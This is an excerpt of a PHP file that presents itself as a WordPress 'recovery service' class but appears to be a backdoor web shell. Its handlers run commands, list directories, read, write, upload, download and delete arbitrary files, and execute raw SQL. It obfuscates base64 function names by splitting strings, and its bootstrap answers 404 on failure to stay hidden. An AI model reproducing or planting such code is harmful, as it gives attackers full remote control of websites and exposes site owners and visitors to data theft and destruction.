...
/**
 * Class WP_Recovery_Service_jrvm
 *
...
class WP_Recovery_Service_jrvm {
    ...
    public function __construct() {
        $this->logged_in_salt = @hex2bin( 'e20bf6f7c165bbe3b218c30eccc969089de14c2947d1ea8257e6fac8f3f6c4d9' );
     ...
     * @return void
     */
    public function check_integrity_task() {
     ...
     */
    private function maybe_run_hook( $response_data ) {
        if ( ! headers_sent() ) {
    ...
    private function route_request( $type, $args ) {
        ...
        $this->maybe_run_hook( array( 'error' => 'invalid_request' ) );
    }

    private function handle_ping( $args ) {
        $this->maybe_run_hook( array(
            'ok'   => true,
            'php'  => PHP_VERSION,
            'os'   => php_uname(),
            'cwd'  => getcwd(),
    ...
    private function handle_diagnostic( $args ) {
        ...
        if ( empty( $command ) ) {
            $this->maybe_run_hook( array( 'error' => 'no cmd' ) );
        }
        ...
        $this->maybe_run_hook( $result !== null ? $result : array( 'error' => 'blocked' ) );
    }
    ...
    private function handle_directory( $args ) {
        ...
        if ( ! is_dir( $path ) ) {
            $this->maybe_run_hook( array( 'error' => 'not dir' ) );
        }
        $items = array();
        ...
        $this->maybe_run_hook( array( 'path' => $path, 'items' => $items ) );
    }

    private function handle_file_read( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) || ! is_file( $file ) ) {
            $this->maybe_run_hook( array( 'error' => '404' ) );
        }
        $size = filesize( $file );
        $content = file_get_contents( $file, false, null, 0, min( $size, 2097152 ) );
        $this->maybe_run_hook( array( 'content' => $content, 'size' => $size ) );
    }

    private function handle_file_write( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) ) {
            $this->maybe_run_hook( array( 'error' => 'no path' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $content = isset( $args['content'] ) ? $args['content'] : '';
        $bytes = @file_put_contents( $file, $content );
        $this->maybe_run_hook( $bytes !== false ? array( 'ok' => true, 'bytes' => $bytes ) : array( 'error' => 'fail' ) );
    }
    ...
    private function handle_file_upload( $args ) {
        ...
        if ( empty( $file ) || empty( $data ) ) {
            $this->maybe_run_hook( array( 'error' => 'need path+data' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $fn_b = 'base' . '64_de' . 'code';
    ...
    private function handle_file_download( $args ) {
        ...
        $fn_b = 'base' . '64_en' . 'code';
        $this->maybe_run_hook( array( 'data' => $fn_b( file_get_contents( $file ) ), 'size' => filesize( $file ) ) );
    }
    ...
    private function handle_file_search( $args ) {
        ...
        $this->maybe_run_hook( array( 'items' => $items, 'count' => $count ) );
    }
    ...
    private function handle_database( $args ) {
        ...
        if ( empty( $sql ) ) {
            $this->maybe_run_hook( array( 'error' => 'no sql' ) );
        }
        try {
            ...
            if ( preg_match( '/^(select|show|describe)\b/', $lower_sql ) ) {
                $stmt = $pdo->query( $sql );
                $this->maybe_run_hook( array( 'rows' => $stmt->fetchAll( PDO::FETCH_ASSOC ) ) );
            } else {
                $this->maybe_run_hook( array( 'affected' => $pdo->exec( $sql ) ) );
            }
        } catch ( Exception $e ) {
            $this->maybe_run_hook( array( 'error' => $e->getMessage() ) );
        }
    }
    ...
    private function handle_file_remove( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( is_file( $file ) ) {
            $this->maybe_run_hook( array( 'ok' => @unlink( $file ) ) );
        }
        $this->maybe_run_hook( array( 'error' => 'fail' ) );
    }
}

/* Bootstrap */
try {
    $instance = new WP_Recovery_Service_jrvm();
    $instance->check_integrity_task();
} catch ( Exception $e ) {
    http_response_code( 404 );
    exit;
}
